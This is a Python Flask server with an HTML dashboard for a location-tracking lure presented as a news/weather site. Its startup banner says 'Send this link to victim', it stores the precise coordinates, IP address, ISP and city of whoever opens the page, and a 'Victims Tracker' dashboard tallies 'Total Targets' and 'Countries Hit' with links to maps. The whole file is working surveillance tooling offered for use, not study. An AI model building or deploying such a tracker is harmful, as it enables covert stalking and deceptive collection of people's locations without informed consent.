#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import datetime
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Directory to store location files
LOCATIONS_DIR = "victim_locations"
DB_FILE = os.path.join(LOCATIONS_DIR, "victims.json")

# Create directory if it doesn't exist
if not os.path.exists(LOCATIONS_DIR):
    os.makedirs(LOCATIONS_DIR)
    print(f"📁 Created directory: {LOCATIONS_DIR}")

def load_victims():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error loading {DB_FILE}: {e}")
            return []
    return []

def save_victims(victims):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(victims, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Error saving to {DB_FILE}: {e}")

def migrate_existing_data():
    migrated_count = 0
    victims = load_victims()
    
    # Track unique entries by a combination of timestamp, ip, lat, lon
    existing_keys = set()
    for v in victims:
        key = (v.get('timestamp'), v.get('ip'), v.get('lat'), v.get('lon'))
        existing_keys.add(key)
        
    if os.path.exists(LOCATIONS_DIR):
        for filename in os.listdir(LOCATIONS_DIR):
            if filename.endswith('.json') and filename != 'victims.json':
                json_path = os.path.join(LOCATIONS_DIR, filename)
                html_path = os.path.join(LOCATIONS_DIR, filename.replace('.json', '.html'))
                
                try:
                    with open(json_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                    
                    # Basic validation of location data
                    if 'lat' in data and 'lon' in data:
                        key = (data.get('timestamp'), data.get('ip'), data.get('lat'), data.get('lon'))
                        if key not in existing_keys:
                            if 'id' not in data:
                                import uuid
                                data['id'] = str(uuid.uuid4())
                            victims.append(data)
                            existing_keys.add(key)
                            migrated_count += 1
                            
                    # Remove the old files
                    os.remove(json_path)
                    print(f"🧹 Deleted old JSON file: {json_path}")
                    if os.path.exists(html_path):
                        os.remove(html_path)
                        print(f"🧹 Deleted old HTML file: {html_path}")
                except Exception as e:
                    print(f"⚠️ Failed to migrate/delete {filename}: {e}")
                    
    if migrated_count > 0:
        save_victims(victims)
        print(f"✅ Migrated {migrated_count} legacy victim(s) to {DB_FILE}")

# Run migration on start
migrate_existing_data()

# ============================================================
# ROUTE: Serve the HTML page
# ============================================================
@app.route('/')
def index():
    return send_file('templates/index.html')

# ============================================================
# ROUTE: Save location and create HTML file
# ============================================================
@app.route('/save-location', methods=['POST'])
def save_location():
    try:
        data = request.json
        print("📥 Received data:", data)
        
        # Extract data
        lat = data.get('lat')
        lon = data.get('lon')
        accuracy = data.get('accuracy', 50)
        city = data.get('city', 'Unknown')
        region = data.get('region', 'Unknown')
        country = data.get('country', 'Unknown')
        isp = data.get('isp', 'Unknown')
        timestamp = data.get('timestamp', datetime.datetime.now().isoformat())
        ip = data.get('ip', 'Unknown')
        
        if lat is None or lon is None:
            return jsonify({
                'success': False,
                'error': 'Latitude and longitude are required'
            }), 400
            
        # Unique ID for deletion/references
        import uuid
        data['id'] = str(uuid.uuid4())
        
        # Clean numeric values
        try:
            data['lat'] = float(lat)
            data['lon'] = float(lon)
            data['accuracy'] = float(accuracy)
        except Exception:
            pass
            
        # Append to victims JSON
        victims = load_victims()
        victims.append(data)
        save_victims(victims)
        
        print(f"✅ Victim location stored in victims.json: {city}, {region} ({lat}, {lon})")
        
        return jsonify({
            'success': True,
            'message': 'Location saved successfully',
            'city': city,
            'region': region
        }), 200
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# ============================================================
# ROUTE: List all captured locations (Dashboard)
# ============================================================
@app.route('/victims')
def list_victims():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ GeoNews - Victim Dashboard</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #050505;
            --card-bg: rgba(18, 18, 18, 0.7);
            --border-color: rgba(255, 255, 255, 0.08);
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --accent-red: #ff3366;
            --accent-red-glow: rgba(255, 51, 102, 0.15);
            --accent-green: #00ff66;
            --accent-green-glow: rgba(0, 255, 102, 0.15);
            --accent-blue: #0088ff;
            --accent-blue-glow: rgba(0, 136, 255, 0.2);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(at 10% 10%, rgba(255, 51, 102, 0.03) 0px, transparent 50%),
                radial-gradient(at 90% 90%, rgba(0, 255, 102, 0.03) 0px, transparent 50%),
                radial-gradient(at 50% 10%, rgba(0, 136, 255, 0.03) 0px, transparent 50%);
            background-attachment: fixed;
            color: var(--text-primary);
            min-height: 100vh;
            padding: 40px 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            width: 100%;
            max-width: 1200px;
            animation: fadeIn 0.8s ease-out;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 20px;
        }

        .logo-section h1 {
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #ffffff 30%, #a0a0a0 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .logo-section h1 span {
            color: var(--accent-red);
            -webkit-text-fill-color: var(--accent-red);
            text-shadow: 0 0 15px rgba(255, 51, 102, 0.5);
        }

        .logo-section p {
            font-size: 14px;
            color: var(--text-secondary);
            margin-top: 4px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 24px;
            backdrop-filter: blur(12px);
            display: flex;
            flex-direction: column;
            gap: 10px;
            position: relative;
            overflow: hidden;
            transition: var(--transition);
        }

        .stat-card:hover {
            transform: translateY(-2px);
            border-color: rgba(255, 255, 255, 0.15);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: var(--accent-blue);
        }

        .stat-card.red::before { background: var(--accent-red); }
        .stat-card.green::before { background: var(--accent-green); }

        .stat-card h3 {
            font-size: 14px;
            font-weight: 500;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-card .value {
            font-size: 36px;
            font-weight: 700;
            color: var(--text-primary);
        }

        .dashboard-body {
            background: var(--card-bg);
            border: 1px solid var(--border-color);
            border-radius: 20px;
            backdrop-filter: blur(12px);
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        .control-bar {
            padding: 24px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
        }

        .search-container {
            position: relative;
            flex-grow: 1;
            max-width: 450px;
            width: 100%;
        }

        .search-input {
            width: 100%;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-color);
            padding: 12px 16px 12px 42px;
            border-radius: 12px;
            color: var(--text-primary);
            font-family: inherit;
            font-size: 14px;
            transition: var(--transition);
        }

        .search-input:focus {
            outline: none;
            border-color: var(--accent-blue);
            background: rgba(255, 255, 255, 0.08);
            box-shadow: 0 0 15px var(--accent-blue-glow);
        }

        .search-container svg {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            width: 18px;
            height: 18px;
            fill: none;
            stroke: var(--text-secondary);
            stroke-width: 2;
            pointer-events: none;
        }

        .refresh-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            padding: 12px 20px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: var(--transition);
        }

        .refresh-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: rgba(255, 255, 255, 0.2);
          }

          .refresh-btn:active {
              transform: scale(0.97);
          }

          .table-container {
              width: 100%;
              overflow-x: auto;
          }

          table {
              width: 100%;
              border-collapse: collapse;
              text-align: left;
          }

          th {
              padding: 16px 24px;
              font-size: 12px;
              font-weight: 600;
              text-transform: uppercase;
              letter-spacing: 0.5px;
              color: var(--text-secondary);
              border-bottom: 1px solid var(--border-color);
          }

          td {
              padding: 18px 24px;
              font-size: 14px;
              border-bottom: 1px solid var(--border-color);
              vertical-align: middle;
          }

          tr:last-child td {
              border-bottom: none;
          }

          tr {
              transition: var(--transition);
          }

          tr:hover td {
              background: rgba(255, 255, 255, 0.015);
          }

          .victim-ip {
              font-weight: 700;
              font-family: monospace;
              color: var(--text-primary);
              font-size: 14px;
          }

          .victim-isp {
              font-size: 12px;
              color: var(--text-secondary);
              margin-top: 2px;
          }

          .location-badge {
              display: inline-flex;
              align-items: center;
              gap: 6px;
          }

          .country-flag {
              font-size: 16px;
          }

          .location-text {
              display: flex;
              flex-direction: column;
          }

          .city-name {
              font-weight: 600;
          }

          .region-name {
              font-size: 12px;
              color: var(--text-secondary);
          }

          .coords-info {
              display: flex;
              flex-direction: column;
              gap: 2px;
          }

          .lat-lon {
              font-family: monospace;
              font-size: 13px;
          }

          .accuracy-badge {
              display: inline-block;
              font-size: 11px;
              padding: 2px 8px;
              border-radius: 20px;
              font-weight: 500;
              background: rgba(255, 255, 255, 0.05);
              border: 1px solid var(--border-color);
              width: fit-content;
          }

          .accuracy-high {
              background: var(--accent-green-glow);
              border-color: rgba(0, 255, 102, 0.2);
              color: var(--accent-green);
          }

          .timestamp-cell {
              color: var(--text-secondary);
              font-size: 13px;
          }

          .actions-cell {
              display: flex;
              gap: 10px;
              justify-content: flex-end;
          }

          .btn {
              padding: 8px 16px;
              border-radius: 8px;
              font-size: 13px;
              font-weight: 600;
              cursor: pointer;
              text-decoration: none;
              display: inline-flex;
              align-items: center;
              gap: 6px;
              transition: var(--transition);
              border: none;
          }

          .btn-map {
              background: var(--accent-green);
              color: #000;
          }

          .btn-map:hover {
              box-shadow: 0 0 15px rgba(0, 255, 102, 0.4);
              transform: translateY(-1px);
          }

          .btn-delete {
              background: rgba(255, 51, 102, 0.1);
              border: 1px solid rgba(255, 51, 102, 0.2);
              color: var(--accent-red);
          }

          .btn-delete:hover {
              background: var(--accent-red);
              color: white;
              box-shadow: 0 0 15px rgba(255, 51, 102, 0.4);
              transform: translateY(-1px);
          }

          .empty-state {
              padding: 60px 24px;
              text-align: center;
              color: var(--text-secondary);
          }

          .empty-state svg {
              width: 48px;
              height: 48px;
              stroke: var(--text-secondary);
              stroke-width: 1.5;
              margin-bottom: 16px;
          }

          .empty-state h3 {
              color: var(--text-primary);
              margin-bottom: 8px;
          }

          @keyframes fadeIn {
              from { opacity: 0; transform: translateY(10px); }
              to { opacity: 1; transform: translateY(0); }
          }

          .spinner {
              width: 18px;
              height: 18px;
              border: 2px solid transparent;
              border-top-color: currentColor;
              border-radius: 50%;
              animation: spin 0.8s linear infinite;
          }

          @keyframes spin {
              to { transform: rotate(360deg); }
          }
      </style>
  </head>
  <body>
      <div class="container">
          <header>
              <div class="logo-section">
                  <h1><span>🔴</span> GEO NEWS • Victims Tracker</h1>
                  <p>Real-time location capture and tracking</p>
              </div>
              <button class="refresh-btn" id="refreshBtn">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" id="refreshIcon"><path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/></svg>
                  Refresh Data
              </button>
          </header>

          <div class="stats-grid">
              <div class="stat-card red">
                  <h3>Total Targets</h3>
                  <div class="value" id="totalCount">0</div>
              </div>
              <div class="stat-card green">
                  <h3>Countries Hit</h3>
                  <div class="value" id="countriesCount">0</div>
              </div>
              <div class="stat-card">
                  <h3>Highest Accuracy</h3>
                  <div class="value" id="bestAccuracy">--</div>
              </div>
          </div>

          <div class="dashboard-body">
              <div class="control-bar">
                  <div class="search-container">
                      <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                      <input type="text" class="search-input" id="searchInput" placeholder="Search by IP, City, Country, or ISP...">
                  </div>
              </div>

              <div class="table-container">
                  <table>
                      <thead>
                          <tr>
                              <th>Victim / ISP</th>
                              <th>Location Info</th>
                              <th>Coordinates & Accuracy</th>
                              <th>Time Logged</th>
                              <th style="text-align: right;">Actions</th>
                          </tr>
                      </thead>
                      <tbody id="victimsList">
                      </tbody>
                  </table>
              </div>

              <div class="empty-state" id="emptyState" style="display: none;">
                  <svg fill="none" viewBox="0 0 24 24"><path d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" stroke-linecap="round" stroke-linejoin="round"/></svg>
                  <h3>No Targets Found</h3>
                  <p>No victims have allowed location access yet, or search filter returned no results.</p>
              </div>
          </div>
      </div>

      <script>
          let victimsData = [];

          document.addEventListener('DOMContentLoaded', () => {
              loadVictims();
              document.getElementById('refreshBtn').addEventListener('click', loadVictims);
              document.getElementById('searchInput').addEventListener('input', filterVictims);
          });

          function formatTimestamp(isoStr) {
              if (!isoStr) return '--';
              try {
                  const date = new Date(isoStr);
                  return date.toLocaleString();
              } catch (e) {
                  return isoStr;
              }
          }

          function getFlagEmoji(country) {
              if (!country || country === 'Unknown') return '🌍';
              const countryCodes = {
                  'pakistan': 'pk', 'india': 'in', 'united states': 'us', 'united kingdom': 'gb',
                  'canada': 'ca', 'australia': 'au', 'germany': 'de', 'france': 'fr',
                  'saudi arabia': 'sa', 'united arab emirates': 'ae'
              };
              const lowerCountry = country.toLowerCase().trim();
              const code = countryCodes[lowerCountry] || null;
              if (code) {
                  return code.toUpperCase().replace(/./g, char => String.fromCodePoint(char.charCodeAt(0) + 127397));
              }
              return '🌍';
          }

          function loadVictims() {
              const refreshIcon = document.getElementById('refreshIcon');
              refreshIcon.classList.add('spinner');
              fetch('/api/victims')
                  .then(res => res.json())
                  .then(data => {
                      victimsData = data;
                      renderVictims(data);
                      updateStats(data);
                  })
                  .catch(err => console.error('Error fetching victims:', err))
                  .finally(() => refreshIcon.classList.remove('spinner'));
          }

          function renderVictims(data) {
              const tbody = document.getElementById('victimsList');
              const emptyState = document.getElementById('emptyState');
              tbody.innerHTML = '';

              if (data.length === 0) {
                  emptyState.style.display = 'block';
                  return;
              } else {
                  emptyState.style.display = 'none';
              }

              data.forEach(victim => {
                  const tr = document.createElement('tr');
                  const ip = victim.ip || 'Unknown';
                  const isp = victim.isp || 'Unknown';
                  const city = victim.city || 'Unknown';
                  const region = victim.region || 'Unknown';
                  const country = victim.country || 'Unknown';
                  const flag = getFlagEmoji(country);
                  const lat = victim.lat;
                  const lon = victim.lon;
                  const accuracy = victim.accuracy ? Math.round(victim.accuracy) : null;
                  const accuracyClass = (accuracy !== null && accuracy <= 30) ? 'accuracy-badge accuracy-high' : 'accuracy-badge';
                  const accuracyText = accuracy !== null ? `${accuracy} m` : 'Unknown';
                  const timestamp = formatTimestamp(victim.timestamp);
                  
                  tr.innerHTML = `
                      <td>
                          <div class="victim-ip">${ip}</div>
                          <div class="victim-isp">${isp}</div>
                      </td>
                      <td>
                          <div class="location-badge">
                              <span class="country-flag">${flag}</span>
                              <div class="location-text">
                                  <span class="city-name">${city}</span>
                                  <span class="region-name">${region}, ${country}</span>
                              </div>
                          </div>
                      </td>
                      <td>
                          <div class="coords-info">
                              <span class="lat-lon">${lat}, ${lon}</span>
                              <span class="${accuracyClass}">🎯 ${accuracyText}</span>
                          </div>
                      </td>
                      <td class="timestamp-cell">${timestamp}</td>
                      <td>
                          <div class="actions-cell">
                              <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="btn btn-map">
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2a8 8 0 0 0-8 8c0 5.25 8 12 8 12s8-6.75 8-12a8 8 0 0 0-8-8z"/><circle cx="12" cy="10" r="3"/></svg>
                                  Open Map
                              </a>
                              <button class="btn btn-delete" onclick="deleteVictim('${victim.id}')">
                                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>
                                  Delete
                              </button>
                          </div>
                      </td>
                  `;
                  tbody.appendChild(tr);
              });
          }

          function updateStats(data) {
              document.getElementById('totalCount').textContent = data.length;
              const countries = new Set(data.map(v => v.country).filter(c => c && c !== 'Unknown'));
              document.getElementById('countriesCount').textContent = countries.size;
              const accuracies = data.map(v => v.accuracy).filter(a => a !== null && a !== undefined && !isNaN(a));
              if (accuracies.length > 0) {
                  const best = Math.round(Math.min(...accuracies));
                  document.getElementById('bestAccuracy').textContent = `${best} m`;
              } else {
                  document.getElementById('bestAccuracy').textContent = '--';
              }
          }

          function filterVictims() {
              const query = document.getElementById('searchInput').value.toLowerCase().trim();
              if (!query) {
                  renderVictims(victimsData);
                  return;
              }
              const filtered = victimsData.filter(v => {
                  const ip = (v.ip || '').toLowerCase();
                  const city = (v.city || '').toLowerCase();
                  const region = (v.region || '').toLowerCase();
                  const country = (v.country || '').toLowerCase();
                  const isp = (v.isp || '').toLowerCase();
                  return ip.includes(query) || city.includes(query) || region.includes(query) || country.includes(query) || isp.includes(query);
              });
              renderVictims(filtered);
          }

          function deleteVictim(id) {
              if (!confirm('Are you sure you want to delete this target?')) return;
              fetch('/api/victims/' + id, { method: 'DELETE' })
                  .then(res => res.json())
                  .then(res => {
                      if (res.success) loadVictims();
                      else alert('Error deleting victim: ' + (res.error || 'Unknown error'));
                  })
                  .catch(err => {
                      console.error('Error deleting victim:', err);
                      alert('Server connection error.');
                  });
          }
      </script>
  </body>
  </html>'''

# ============================================================
# ROUTE: API to get all victims (JSON)
# ============================================================
@app.route('/api/victims', methods=['GET'])
def get_victims_api():
    try:
        victims = load_victims()
        modified = False
        for v in victims:
            if 'id' not in v:
                import uuid
                v['id'] = str(uuid.uuid4())
                modified = True
        if modified:
            save_victims(victims)
        try:
            victims.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
        except Exception:
            pass
        return jsonify(victims)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# ROUTE: API to delete a victim
# ============================================================
@app.route('/api/victims/<victim_id>', methods=['DELETE'])
def delete_victim_api(victim_id):
    try:
        victims = load_victims()
        new_victims = [v for v in victims if v.get('id') != victim_id]
        if len(new_victims) < len(victims):
            save_victims(new_victims)
            return jsonify({'success': True, 'message': 'Victim deleted successfully'}), 200
        else:
            return jsonify({'success': False, 'error': 'Victim not found'}), 404
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║  🔴 GEO NEWS WEATHER TRACKER                             ║
    ║                                                           ║
    ║  📍 Victims saved in: victim_locations/                  ║
    ║                                                           ║
    ║  🌐 Server: http://localhost:5000                        ║
    ║  📊 View victims: http://localhost:5000/victims         ║
    ║                                                           ║
    ║  ⚠️ Send this link to victim:                            ║
    ║     http://YOUR_IP:5000/                                 ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    app.run(host='0.0.0.0', port=5000, debug=True)